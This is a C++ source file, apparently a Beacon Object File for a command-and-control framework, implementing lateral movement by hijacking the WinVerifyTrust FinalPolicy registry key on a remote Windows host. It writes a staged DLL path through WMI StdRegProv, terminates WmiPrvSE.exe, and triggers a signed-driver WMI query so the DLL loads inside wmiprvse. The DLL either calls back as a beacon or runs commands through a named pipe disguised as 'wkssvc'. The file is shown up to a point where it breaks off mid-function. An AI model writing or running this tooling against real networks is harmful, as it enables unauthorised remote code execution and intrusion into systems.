/*
 * tmb_sipexec.cpp -- Lateral movement via WinVerifyTrust FinalPolicy hijack
 *
 * Two modes:
 *   jump (mode=0):        Hijack FinalPolicy, trigger WMI, DLL calls back as beacon
 *   remote-exec (mode=1): Hijack FinalPolicy, trigger WMI, connect pipe, run cmd, return output
 *
 * DLL must be pre-staged on target (upload separately via SMB/upload command).
 * Uses current token. Run make_token / steal_token first if needed.
 *
 * Args (packed by aggressor/axscript):
 *   short  mode           0=jump, 1=exec
 *   char*  target         hostname or IP
 *   char*  dll_path       path to DLL on target (local or UNC)
 *   char*  command        command to run (exec mode only, empty for jump)
 *   char*  guid           FinalPolicy GUID alias: "default", "driver", "https"
 *   char*  func           $Function export name (default: SoftpubAuthenticode)
 *   short  no_cleanup     1 = skip registry restore
 */

#include <windows.h>
#include <wbemcli.h>
#include <stdio.h>

extern "C" {
#include "beacon.h"

void go(char *args, int alen);

/* ---- Win32 imports (BOF convention) ---- */
DECLSPEC_IMPORT HMODULE  WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT VOID     WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT void*    WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT VOID     WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI*);
DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);

DECLSPEC_IMPORT BSTR     WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT VOID     WINAPI OLEAUT32$SysFreeString(BSTR);

WINBASEAPI int __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char*);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char*, const char*);
WINBASEAPI void* __cdecl MSVCRT$memset(void*, int, size_t);
WINBASEAPI void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT HLOCAL   WINAPI KERNEL32$LocalFree(HLOCAL);

} /* extern "C" */

/* ---- C runtime stubs required by C++ in BOF context ---- */
/* ponytail: C++ zero-init, stack probes, and delete aren't available in BOFs.
 * Provide minimal stubs. If the BOF grows past 4KB stack frames, __chkstk_ms
 * needs a real implementation. */
extern "C" {
void *memset(void *s, int c, size_t n) { return MSVCRT$memset(s, c, n); }
void *memcpy(void *d, const void *s, size_t n) { return MSVCRT$memcpy(d, s, n); }
#ifdef __x86_64__
void ___chkstk_ms(void) { }
#endif
}
void operator delete(void *p) noexcept { if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p); }
void operator delete(void *p, unsigned long long) noexcept { if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p); }

/* ---- Macros ---- */
#define TMB_OK(fmt, ...)    BeaconPrintf(CALLBACK_OUTPUT, "[+] " fmt, ##__VA_ARGS__)
#define TMB_INFO(fmt, ...)  BeaconPrintf(CALLBACK_OUTPUT, "[*] " fmt, ##__VA_ARGS__)
#define TMB_WARN(fmt, ...)  BeaconPrintf(CALLBACK_OUTPUT, "[!] " fmt, ##__VA_ARGS__)
#define TMB_ERR(fmt, ...)   BeaconPrintf(CALLBACK_ERROR,  "[-] " fmt, ##__VA_ARGS__)

/* ---- FinalPolicy GUIDs ---- */
#define FP_GUID_DEFAULT  "{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"
#define FP_GUID_DRIVER   "{573E31F8-AABA-11D0-8CCB-00C04FC295EE}"
#define FP_GUID_HTTPS    "{FC451C16-AC75-11D1-B4B8-00C04FB66EA0}"

#define FP_KEY_PREFIX    "SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\"

/* ---- Pipe marker (must match payload) ---- */
#define PIPE_DONE_MARKER "\n[DONE]\n"
#define PIPE_DONE_LEN    8

/* ---- FNV-1a (must match payload's derivation) ---- */
static unsigned int fnv1a(const char *s) {
    unsigned int h = 2166136261u;
    for (; *s; s++) { h ^= (unsigned char)*s; h *= 16777619u; }
    return h;
}

static void derive_pipe_name(const char *dll_basename, char *out, int outlen) {
    /* lowercase the basename */
    char lower[260] = {0};
    int i = 0;
    for (; dll_basename[i] && i < 259; i++)
        lower[i] = (dll_basename[i] >= 'A' && dll_basename[i] <= 'Z')
                   ? dll_basename[i] + 32 : dll_basename[i];
    lower[i] = '\0';
    MSVCRT$_snprintf(out, outlen, "\\\\%s\\pipe\\wkssvc_%08x", "", fnv1a(lower));
}

/* ---- Extract basename from path ---- */
static const char* basename_of(const char *path) {
    const char *p = path;
    for (const char *q = path; *q; q++)
        if (*q == '\\' || *q == '/') p = q + 1;
    return p;
}

/* ---- Check if file exists on target via SMB ---- */
static BOOL file_exists(const char *target, const char *dll_path) {
    char check_path[512];
    if (dll_path[0] == '\\' && dll_path[1] == '\\') {
        /* Already UNC, use as-is */
        MSVCRT$_snprintf(check_path, sizeof(check_path), "%s", dll_path);
    } else if (dll_path[1] == ':' && dll_path[2] == '\\') {
        /* C:\path\foo.dll -> \\target\C$\path\foo.dll */
        MSVCRT$_snprintf(check_path, sizeof(check_path), "\\\\%s\\%c$\\%s",
                         target, dll_path[0], dll_path + 3);
    } else {
        /* Relative or unknown -- skip check */
        return TRUE;
    }

    HANDLE hFile = KERNEL32$CreateFileA(check_path, GENERIC_READ, FILE_SHARE_READ,
                                         NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        TMB_ERR("DLL not found: %s (checked %s)", dll_path, check_path);
        TMB_INFO("Upload it first, then retry.");
        return FALSE;
    }
    KERNEL32$CloseHandle(hFile);
    return TRUE;
}

/* ================================================================
 * WMI connection helper -- connect to a namespace on target
 * ================================================================ */
static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) {
    CLSID clsid_WbemLocator = {0x4590f811, 0x1d3a, 0x11d0,
                                 {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
    IID iid_IWbemLocator = {0xdc12a687, 0x737f, 0x11cf,
                             {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};

    IWbemLocator *pLocator = NULL;
    HRESULT hr = OLE32$CoCreateInstance(clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                         iid_IWbemLocator, (void**)&pLocator);
    if (FAILED(hr)) {
        TMB_ERR("CoCreateInstance(WbemLocator) failed: 0x%08lx", hr);
        return NULL;
    }

    /* Build \\target\NAMESPACE path */
    wchar_t wTarget[512];
    int i = 0;
    wTarget[i++] = L'\\'; wTarget[i++] = L'\\';
    for (const char *p = target; *p && i < 480; p++) wTarget[i++] = (wchar_t)*p;
    wTarget[i++] = L'\\';
    for (int j = 0; ns_suffix[j] && i < 510; j++) wTarget[i++] = ns_suffix[j];
    wTarget[i] = L'\0';

    TMB_INFO("Connecting WMI: %S", wTarget);

    BSTR bstrTarget = OLEAUT32$SysAllocString(wTarget);
    IWbemServices *pSvc = NULL;
    hr = pLocator->ConnectServer(bstrTarget, NULL, NULL, 0,
                                  WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
    OLEAUT32$SysFreeString(bstrTarget);
    pLocator->Release();

    if (FAILED(hr)) {
        TMB_ERR("WMI ConnectServer failed: 0x%08lx", hr);
        return NULL;
    }

    OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                             NULL, EOAC_NONE);
    TMB_INFO("WMI connected");
    return pSvc;
}

/* ================================================================
 * DCOM WMI connection -- uses IWbemLevel1Login like impacket
 *
 * ponytail: CoCreateInstance(WbemLocator, INPROC) + ConnectServer creates a
 * local COM proxy. ExecQuery runs through the proxy and does NOT trigger
 * WVT FinalPolicy inside wmiprvse on the target. impacket uses
 * CoCreateInstanceEx(IWbemLevel1Login, REMOTE_SERVER) which activates
 * the COM object inside wmiprvse via DCOM. All calls then run server-side,
 * triggering WVT. This function replicates that path.
 * ================================================================ */

/* IWbemLevel1Login vtable layout (from wbemcli.h / wbemint.h) */
struct IWbemLevel1Login : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE EstablishPosition(LPWSTR, DWORD, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE RequestChallenge(LPWSTR, LPWSTR, DWORD, LPWSTR, DWORD, LPWSTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE WBEMLogin(LPWSTR, BYTE*, long, IWbemContext*, IWbemServices**) = 0;
    virtual HRESULT STDMETHODCALLTYPE NTLMLogin(LPWSTR, LPWSTR, long, IWbemContext*, IWbemServices**) = 0;
};

static IWbemServices* wmi_connect_dcom(const char *target, const wchar_t *ns_suffix) {
    /* CLSID_WbemLevel1Login {8BC3F05E-D86B-11D0-A075-00C04FB68820} */
    CLSID clsid_L1Login = {0x8BC3F05E, 0xD86B, 0x11D0,
                             {0xA0, 0x75, 0x00, 0xC0, 0x4F, 0xB6, 0x88, 0x20}};
    /* IID_IWbemLevel1Login {F309AD18-D86A-11D0-A075-00C04FB68820} */
    IID iid_L1Login = {0xF309AD18, 0xD86A, 0x11D0,
                        {0xA0, 0x75, 0x00, 0xC0, 0x4F, 0xB6, 0x88, 0x20}};

    /* Wide target for COSERVERINFO */
    wchar_t wTarget[256];
    int i = 0;
    for (const char *p = target; *p && i < 254; p++) wTarget[i++] = (wchar_t)*p;
    wTarget[i] = L'\0';

    COSERVERINFO si;
    MSVCRT$memset(&si, 0, sizeof(si));
    si.pwszName = wTarget;

    MULTI_QI mqi;
    MSVCRT$memset(&mqi, 0, sizeof(mqi));
    mqi.pIID = &iid_L1Login;

    TMB_INFO("DCOM remote activation (IWbemLevel1Login) on %s", target);
    HRESULT hr = OLE32$CoCreateInstanceEx(clsid_L1Login, NULL,
                                           CLSCTX_REMOTE_SERVER, &si, 1, &mqi);
    if (FAILED(hr)) {
        TMB_ERR("CoCreateInstanceEx(WbemLevel1Login) failed: 0x%08lx", hr);
        return NULL;
    }
    if (FAILED(mqi.hr)) {
        TMB_ERR("MULTI_QI query failed: 0x%08lx", mqi.hr);
        return NULL;
    }

    IWbemLevel1Login *pLogin = (IWbemLevel1Login*)mqi.pItf;

    /* Set proxy blanket on the login interface */
    OLE32$CoSetProxyBlanket((IUnknown*)pLogin, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                             NULL, EOAC_NONE);

    /* Build namespace path: //./root/cimv2 format */
    wchar_t wNs[256];
    i = 0;
    wNs[i++] = L'/'; wNs[i++] = L'/'; wNs[i++] = L'.'; wNs[i++] = L'/';
    for (int j = 0; ns_suffix[j] && i < 254; j++) wNs[i++] = ns_suffix[j];
    wNs[i] = L'\0';

    TMB_INFO("NTLMLogin(%S)", wNs);
    IWbemServices *pSvc = NULL;
    hr = pLogin->NTLMLogin(wNs, NULL, 0, NULL, &pSvc);
    pLogin->Release();

    if (FAILED(hr)) {
        TMB_ERR("NTLMLogin failed: 0x%08lx", hr);
        return NULL;
    }

    OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                             NULL, EOAC_NONE);
    TMB_INFO("DCOM WMI connected");
    return pSvc;
}

/* ================================================================
 * Phase 2: Remote registry via WMI StdRegProv
 *
 * Uses root/default namespace -- always available, no RemoteRegistry needed.
 * ================================================================ */

#define WMI_HKLM 0x80000002

typedef struct {
    char orig_dll[260];
    char orig_func[128];
    BOOL had_orig;
} FP_BACKUP;

/* Helper: call StdRegProv.GetStringValue and return the result */
static BOOL stdreg_get_string(IWbemServices *pSvc, const char *subkey,
                               const char *valueName, char *out, int outlen) {
    IWbemClassObject *pClass = NULL, *pInDef = NULL, *pInst = NULL, *pOut = NULL;
    BSTR bstrClass = OLEAUT32$SysAllocString(L"StdRegProv");
    BSTR bstrMethod = OLEAUT32$SysAllocString(L"GetStringValue");
    HRESULT hr;

    hr = pSvc->GetObject(bstrClass, 0, NULL, &pClass, NULL);
    if (FAILED(hr)) goto fail;

    hr = pClass->GetMethod(bstrMethod, 0, &pInDef, NULL);
    if (FAILED(hr)) goto fail;

    hr = pInDef->SpawnInstance(0, &pInst);
    if (FAILED(hr)) goto fail;

    /* Set parameters: hDefKey, sSubKeyName, sValueName */
    {
        VARIANT v;
        v.vt = VT_I4; v.lVal = WMI_HKLM;
        pInst->Put(L"hDefKey", 0, &v, 0);

        wchar_t wBuf[512];
        int i = 0;
        for (; subkey[i] && i < 511; i++) wBuf[i] = (wchar_t)subkey[i];
        wBuf[i] = 0;
        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
        pInst->Put(L"sSubKeyName", 0, &v, 0);
        OLEAUT32$SysFreeString(v.bstrVal);

        i = 0;
        for (; valueName[i] && i < 511; i++) wBuf[i] = (wchar_t)valueName[i];
        wBuf[i] = 0;
        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
        pInst->Put(L"sValueName", 0, &v, 0);
        OLEAUT32$SysFreeString(v.bstrVal);
    }

    hr = pSvc->ExecMethod(bstrClass, bstrMethod, 0, NULL, pInst, &pOut, NULL);
    if (FAILED(hr)) goto fail;

    /* Read sValue from output */
    {
        VARIANT vResult;
        hr = pOut->Get(L"sValue", 0, &vResult, NULL, NULL);
        if (SUCCEEDED(hr) && vResult.vt == VT_BSTR && vResult.bstrVal) {
            int i = 0;
            for (; vResult.bstrVal[i] && i < outlen - 1; i++)
                out[i] = (char)vResult.bstrVal[i];
            out[i] = '\0';
            OLEAUT32$SysFreeString(vResult.bstrVal);
        } else {
            out[0] = '\0';
        }
    }

    if (pOut) pOut->Release();
    if (pInst) pInst->Release();
    if (pInDef) pInDef->Release();
    if (pClass) pClass->Release();
    OLEAUT32$SysFreeString(bstrClass);
    OLEAUT32$SysFreeString(bstrMethod);
    return out[0] != '\0';

fail:
    if (pOut) pOut->Release();
    if (pInst) pInst->Release();
    if (pInDef) pInDef->Release();
    if (pClass) pClass->Release();
    OLEAUT32$SysFreeString(bstrClass);
    OLEAUT32$SysFreeString(bstrMethod);
    return FALSE;
}

/* Helper: call StdRegProv.SetStringValue */
static BOOL stdreg_set_string(IWbemServices *pSvc, const char *subkey,
                               const char *valueName, const char *data) {
    IWbemClassObject *pClass = NULL, *pInDef = NULL, *pInst = NULL, *pOut = NULL;
    BSTR bstrClass = OLEAUT32$SysAllocString(L"StdRegProv");
    BSTR bstrMethod = OLEAUT32$SysAllocString(L"SetStringValue");
    HRESULT hr;

    hr = pSvc->GetObject(bstrClass, 0, NULL, &pClass, NULL);
    if (FAILED(hr)) goto fail;

    hr = pClass->GetMethod(bstrMethod, 0, &pInDef, NULL);
    if (FAILED(hr)) goto fail;

    hr = pInDef->SpawnInstance(0, &pInst);
    if (FAILED(hr)) goto fail;

    {
        VARIANT v;
        wchar_t wBuf[512];
        int i;

        v.vt = VT_I4; v.lVal = WMI_HKLM;
        pInst->Put(L"hDefKey", 0, &v, 0);

        i = 0;
        for (; subkey[i] && i < 511; i++) wBuf[i] = (wchar_t)subkey[i];
        wBuf[i] = 0;
        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
        pInst->Put(L"sSubKeyName", 0, &v, 0);
        OLEAUT32$SysFreeString(v.bstrVal);

        i = 0;
        for (; valueName[i] && i < 511; i++) wBuf[i] = (wchar_t)valueName[i];
        wBuf[i] = 0;
        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
        pInst->Put(L"sValueName", 0, &v, 0);
        OLEAUT32$SysFreeString(v.bstrVal);

        i = 0;
        for (; data[i] && i < 511; i++) wBuf[i] = (wchar_t)data[i];
        wBuf[i] = 0;
        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
        pInst->Put(L"sValue", 0, &v, 0);
        OLEAUT32$SysFreeString(v.bstrVal);
    }

    hr = pSvc->ExecMethod(bstrClass, bstrMethod, 0, NULL, pInst, &pOut, NULL);

    if (pOut) pOut->Release();
    if (pInst) pInst->Release();
    if (pInDef) pInDef->Release();
    if (pClass) pClass->Release();
    OLEAUT32$SysFreeString(bstrClass);
    OLEAUT32$SysFreeString(bstrMethod);
    return SUCCEEDED(hr);

fail:
    if (pOut) pOut->Release();
    if (pInst) pInst->Release();
    if (pInDef) pInDef->Release();
    if (pClass) pClass->Release();
    OLEAUT32$SysFreeString(bstrClass);
    OLEAUT32$SysFreeString(bstrMethod);
    return FALSE;
}

static BOOL hijack_finalpolicy(IWbemServices *pSvc, const char *guid,
                                const char *payload_path, const char *func_name,
                                FP_BACKUP *backup) {
    char keyPath[512];
    MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);

    /* Backup original $DLL and $Function */
    backup->had_orig = stdreg_get_string(pSvc, keyPath, "$DLL",
                                          backup->orig_dll, sizeof(backup->orig_dll));
    stdreg_get_string(pSvc, keyPath, "$Function",
                       backup->orig_func, sizeof(backup->orig_func));

    /* Write hijack */
    if (!stdreg_set_string(pSvc, keyPath, "$DLL", payload_path)) {
        TMB_ERR("StdRegProv.SetStringValue $DLL failed");
        return FALSE;
    }
    stdreg_set_string(pSvc, keyPath, "$Function", func_name);

    TMB_INFO("FinalPolicy hijacked: $DLL -> %s", payload_path);
    return TRUE;
}

static void restore_finalpolicy(IWbemServices *pSvc, const char *guid, FP_BACKUP *backup) {
    if (!backup->had_orig) return;

    char keyPath[512];
    MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);

    stdreg_set_string(pSvc, keyPath, "$DLL", backup->orig_dll);
    stdreg_set_string(pSvc, keyPath, "$Function", backup->orig_func);
    TMB_INFO("FinalPolicy restored");
}

/* ================================================================
 * Phase 3: WMI trigger -- force WinVerifyTrust call on target
 *
 * Queries Win32_PnPSignedDriver which triggers signature verification
 * on driver files, causing wmiprvse.exe to call WinVerifyTrust and
 * load our hijacked FinalPolicy DLL.
 * ================================================================ */
static BOOL trigger_wmi(IWbemServices *pSvc) {
    /* ponytail: WBEM_FLAG_RETURN_IMMEDIATELY is lazy -- query only runs when
     * you iterate via Next(). Must drain the enumerator to force execution
     * inside wmiprvse, which triggers WVT FinalPolicy. */
    BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
    BSTR bstrQuery = OLEAUT32$SysAllocString(L"SELECT * FROM Win32_PnPSignedDriver WHERE DeviceName=\"null\"");

    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr = pSvc->ExecQuery(bstrWQL, bstrQuery,
                          WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                          NULL, &pEnum);
    OLEAUT32$SysFreeString(bstrWQL);
    OLEAUT32$SysFreeString(bstrQuery);

    if (FAILED(hr)) {
        TMB_ERR("ExecQuery failed: 0x%08lx", hr);
        return FALSE;
    }

    /* Drain the enumerator -- this forces wmiprvse to actually execute the query.
     * WHERE DeviceName="null" matches nothing, so this returns immediately after
     * the provider scans and calls WVT for signature checks. */
    if (pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG ret = 0;
        while (pEnum->Next(10000, 1, &pObj, &ret) == S_OK && ret > 0) {
            pObj->Release();
            ret = 0;
        }
        pEnum->Release();
    }

    TMB_INFO("WMI trigger fired (Win32_PnPSignedDriver)");
    KERNEL32$Sleep(3000);
    return TRUE;
}

/* ================================================================
 * Phase 4: Connect to named pipe and execute command (exec mode)
 * ================================================================ */
static BOOL pipe_exec(const char *target, const char *dll_basename,
                      const char *command) {
    /* Derive pipe name using FNV-1a of lowercase DLL basename */
    char lower[260] = {0};
    int i = 0;
    for (; dll_basename[i] && i < 259; i++)
        lower[i] = (dll_basename[i] >= 'A' && dll_basename[i] <= 'Z')
                   ? dll_basename[i] + 32 : dll_basename[i];
    lower[i] = '\0';

    char pipePath[512];
    MSVCRT$_snprintf(pipePath, sizeof(pipePath), "\\\\%s\\pipe\\wkssvc_%08x",
                     target, fnv1a(lower));

    TMB_INFO("Connecting to pipe: %s", pipePath);

    /* Retry loop -- DLL needs time to start pipe_worker */
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int attempt = 0; attempt < 15; attempt++) {
        hPipe = KERNEL32$CreateFileA(pipePath, GENERIC_READ | GENERIC_WRITE,
                                      0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe != INVALID_HANDLE_VALUE) break;
        KERNEL32$Sleep(1000);
    }

    if (hPipe == INVALID_HANDLE_VALUE) {
        TMB_ERR("Failed to connect to pipe after 15s (error %lu)", KERNEL32$GetLastError());
        return FALSE;
    }

    /* Read greeting: "OK <pid> imp=<0|1>\n" */
    char greeting[256] = {0};
    DWORD nRead = 0;
    KERNEL32$ReadFile(hPipe, greeting, sizeof(greeting) - 1, &nRead, NULL);
    if (nRead > 0) {
        greeting[nRead] = '\0';
        TMB_INFO("Pipe: %s", greeting);
    }

    /* Send command */
    DWORD nWritten = 0;
    KERNEL32$WriteFile(hPipe, command, (DWORD)MSVCRT$strlen(command), &nWritten, NULL);

    /* Read output until [DONE] marker */
    char buf[4096];
    int output_len = 0;
    char *output_buf = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(),
                                                   HEAP_ZERO_MEMORY, 65536);
    if (!output_buf) {
        TMB_ERR("HeapAlloc failed");
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    for (;;) {
        nRead = 0;
        if (!KERNEL32$ReadFile(hPipe, buf, sizeof(buf), &nRead, NULL) || nRead == 0)
            break;

        /* Append to output buffer */
        if (output_len + (int)nRead < 65536) {
            for (DWORD j = 0; j < nRead; j++)
                output_buf[output_len++] = buf[j];
        }

        /* Check for DONE marker */
        if (output_len >= PIPE_DONE_LEN) {
            if (output_buf[output_len - PIPE_DONE_LEN] == '\n' &&
                output_buf[output_len - 7] == '[' &&
                output_buf[output_len - 6] == 'D' &&
                output_buf[output_len - 5] == 'O' &&
                output_buf[output_len - 4] == 'N' &&
                output_buf[output_len - 3] == 'E' &&
                output_buf[output_len - 2] == ']' &&
                output_buf[output_len - 1] == '\n') {
                output_len -= PIPE_DONE_LEN;
                break;
            }
        }
    }

    /* Send exit to close pipe cleanly */
    const char *exitcmd = "exit";
    KERNEL32$WriteFile(hPipe, exitcmd, 4, &nWritten, NULL);
    KERNEL32$CloseHandle(hPipe);

    /* Print output */
    output_buf[output_len] = '\0';
    if (output_len > 0) {
        BeaconOutput(CALLBACK_OUTPUT, output_buf, output_len);
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, output_buf);
    return TRUE;
}

/* ================================================================
 * Resolve GUID string from alias
 * ================================================================ */
static const char* resolve_guid(const char *alias) {
    if (!alias || !*alias || MSVCRT$_stricmp(alias, "default") == 0)
        return FP_GUID_DEFAULT;
    if (MSVCRT$_stricmp(alias, "driver") == 0)
        return FP_GUID_DRIVER;
    if (MSVCRT$_stricmp(alias, "https") == 0)
        return FP_GUID_HTTPS;
    /* Raw GUID passthrough */
    if (alias[0] == '{')
        return alias;
    return FP_GUID_DEFAULT;
}

/* ================================================================
 * ENTRY POINT
 * ================================================================ */
extern "C" void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    short mode = BeaconDataShort(&parser);          /* 0=jump, 1=exec */
    int tmp = 0;
    char *target = BeaconDataExtract(&parser, &tmp);
    char *dll_path = BeaconDataExtract(&parser, &tmp);
    char *command = BeaconDataExtract(&parser, &tmp);
    char *guid_alias = BeaconDataExtract(&parser, &tmp);
    char *func_name = BeaconDataExtract(&parser, &tmp);
    short no_cleanup = BeaconDataShort(&parser);

    if (!target || !*target) {
        TMB_ERR("Target is required.");
        return;
    }

    if (!dll_path || !*dll_path) {
        TMB_ERR("DLL path is required (path on target or UNC).");
        return;
    }

    if (mode == 1 && (!command || !*command)) {
        TMB_ERR("Command is required for exec mode.");
        return;
    }

    /* Defaults */
    if (!func_name || !*func_name) func_name = (char*)"SoftpubAuthenticode";
    const char *guid = resolve_guid(guid_alias);
    const char *dll_name = basename_of(dll_path);

    TMB_INFO("SIPExec %s -> %s (FinalPolicy: %s)",
             mode == 0 ? "jump" : "remote-exec", target, guid);

    /* ---- Phase 1: Verify DLL exists on target ---- */
    if (!file_exists(target, dll_path)) {
        return;
    }
    TMB_INFO("DLL verified: %s", dll_path);

    /* ---- Initialize COM + WMI connections ---- */
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        TMB_ERR("CoInitializeEx failed: 0x%08lx", hr);
        return;
    }

    IWbemServices *pSvcDefault = wmi_connect(target, L"ROOT\\DEFAULT");
    if (!pSvcDefault) {
        TMB_ERR("Failed to connect to WMI root/default on %s", target);
        OLE32$CoUninitialize();
        return;
    }

    /* ---- Phase 2: Hijack FinalPolicy via StdRegProv ---- */
    FP_BACKUP backup = {0};
    if (!hijack_finalpolicy(pSvcDefault, guid, dll_path, func_name, &backup)) {
        pSvcDefault->Release();
        OLE32$CoUninitialize();
        return;
    }

    /* ---- Phase 2.5: Kill wmiprvse so a fresh one picks up the hijack ---- */
    /* Provider cache is per-process. Stale wmiprvse won't read new registry. */
    {
        IWbemServices *pSvcKill = wmi_connect_dcom(target, L"ROOT\\CIMV2");
        if (pSvcKill) {
            BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
            BSTR bstrQ = OLEAUT32$SysAllocString(L"SELECT Handle FROM Win32_Process WHERE Name='WmiPrvSE.exe'");
            IEnumWbemClassObject *pEnum = NULL;
            HRESULT hrk = pSvcKill->ExecQuery(bstrWQL, bstrQ,
                WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
            OLEAUT32$SysFreeString(bstrWQL);
            OLEAUT32$SysFreeString(bstrQ);

            if (SUCCEEDED(hrk) && pEnum) {
                IWbemClassObject *pProc = NULL;
                ULONG ret = 0;
                while (pEnum->Next(5000, 1, &pProc, &ret) == S_OK && ret > 0) {
                    BSTR bstrTerm = OLEAUT32$SysAllocString(L"Terminate");
                    IWbemClassObject *pInDef = NULL, *pInInst = NULL;
                    IWbemClassObject *pCls = NULL;
                    BSTR bstrCls = OLEAUT32$SysAllocString(L"Win32_Process");
                    pSvcKill->GetObject(bstrCls, 0, NULL, &pCls, NULL);
                    if (pCls) {
                        pCls->GetMethod(bstrTerm, 0, &pInDef, NULL);
                        if (pInDef) {
                            pInDef->SpawnInstance(0, &pInInst);
                            if (pInInst) {
                                VARIANT vReason;
                                vReason.vt = VT_I4; vReason.lVal = 0;
                                pInInst->Put(L"Reason", 0, &vReason, 0);
                                /* Get __PATH for this instance */
                                VARIANT vPath;
                                pProc->Get(L"__PATH", 0, &vPath, NULL, NULL);
                                if (vPath.vt == VT_BSTR) {
                                    pSvcKill->ExecMethod(vPath.bstrVal, bstrTerm, 0, NULL, pInInst, NULL, NULL);
                                    OLEAUT32$SysFreeString(vPath.bstrVal);
                                }
                                pInInst->Release();
                            }
                            pInDef->Release();
                        }
                        pCls->Release();
                    }
                    OLEAUT32$SysFreeString(bstrCls);
                    OLEAUT32$SysFreeString(bstrTerm);
                    pProc->Release();
                    ret = 0;
                }
                pEnum->Release();
            }
            pSvcKill->Release();
            TMB_INFO("Killed wmiprvse.exe (cache flush)");
            KERNEL32$Sleep(2000); /* wait for WMI to respawn fresh wmiprvse */
        }
    }

    /* ---- Phase 3: Trigger via WMI ---- */
    KERNEL32$Sleep(500);

    IWbemServices *pSvcCimv2 = wmi_connect_dcom(target, L"ROOT\\CIMV2");
    if (!pSvcCimv2) {
        TMB_WARN("Failed to connect to root/cimv2 -- restoring");
